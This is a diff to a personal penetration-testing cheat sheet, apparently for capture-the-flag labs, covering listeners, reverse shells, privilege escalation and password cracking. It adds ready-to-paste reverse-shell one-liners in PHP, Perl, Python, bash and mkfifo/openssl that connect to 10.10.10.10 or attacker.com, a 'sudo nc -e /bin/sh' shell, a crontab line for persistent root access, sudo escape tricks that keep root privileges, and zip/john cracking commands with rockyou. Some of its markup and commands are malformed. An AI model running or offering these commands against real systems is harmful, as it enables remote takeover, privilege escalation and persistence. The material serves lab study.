@@ -66,6 +66,7 @@ I think remmina is slow, compared to xfreerdp.
 
 <b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.10.10 -p 22</code>
 
+
 <h1>Listners</1>
 
 <h2>NETCAT</h2>
@@ -86,7 +87,10 @@ I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload fil
 
 Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
 
+
 <h1>Revers-Shell</h1>
+
+Pentestmonkey <li>http://pentestmonkey.net/</li>
 
 <h2>Bash</h2>
 
@@ -120,25 +124,43 @@ open upp burp and run command in the bottom of the page:
 
 <code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
+<h2>PHP</h2>
+
+php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+<h2>Perl</h2>
+
+perl -e 'use Socket;$i="10.10.10.10";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  
+<h2>Python</h2>
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+<h2>mkfifo</h2>
+
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s
+
+
+
 <h1>Privesc</h1>
+
+<h2>Search programs to privesc</h2>
+<b>sudo -l</b> lists all commands your USER can use with SUDO permissions
+if user dont have premisions try:
+
+Linpeas <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</li>
+
+LinEnum <li>https://github.com/rebootuser/LinEnum</li>
+
 
 
 GTFObins <li>https://gtfobins.github.io/</li>
 
-GTFObins is collection of sudo, SUID and other bypass techniques that can be used for linux.
-<b>sudo -l</b> lists all commands the user can use with sudo permissions
-
-
-<h2>From rbash to bash</h2>
-
-Just ssh to bash (ssh to bash)
-
-ssh user@10.10.10.10 -p 22 -t "bash -l"
 
 <h2>GTFObins</h2>
 
 vim 
-<code>sudo vim</code> followed by <code>:!bash</code> (Can also edit the sudoers file to include all)
+<code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
 
 nmap
 <code>sudo nmap --interactive</code> followed by <code>!sh</code>
@@ -161,8 +183,50 @@ awk
 less
 <code>sudo less /etc/profile followed by !/bin/sh</code>
 
+<code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
+
 ftp
 <code>sudo ftp</code>followed by <code>!/bin/sh</code>
 
 more
 <code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
+
+nc
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+Run <code>nc -l -p 5555</code> on the attacker box to receive the shell. This only works with netcat traditional.
+
+RHOST=attacker.com
+
+RPORT=5555
+
+sudo nc -e /bin/sh $RHOST $RPORT
+
+------
+
+add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
+
+
+<h1>Shell Tips!</h1>
+
+<b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
+
+<h1>Stabalize your shell<h1>
+
+
+<h1>Password Cracking</h1>
+
+<b>ZIP</b>
+
+<code>fcrackzip -u -D -p /opt/wordlists/rockyou.txt zipfile-with-password.zip</code>
+
+<b>or</b>
+
+<code>zip2john zip.zip > zip.hash</code>
+
+<code>john --format=PKZIP ziphash.txt</code>
+
+<code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>
+
+
